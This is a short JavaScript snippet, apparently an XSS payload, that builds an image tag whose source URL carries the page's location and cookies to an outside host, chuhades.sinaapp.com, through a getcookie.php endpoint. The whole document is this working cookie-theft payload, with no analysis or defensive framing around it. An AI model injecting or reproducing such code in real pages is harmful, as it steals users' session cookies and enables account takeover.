var img = document.createElement("img");
img.src = "http://chuhades.sinaapp.com/getcookie.php?location="+escape(document.location)+'&cookie='+escape(document.cookie);
document.body.appendChild(img);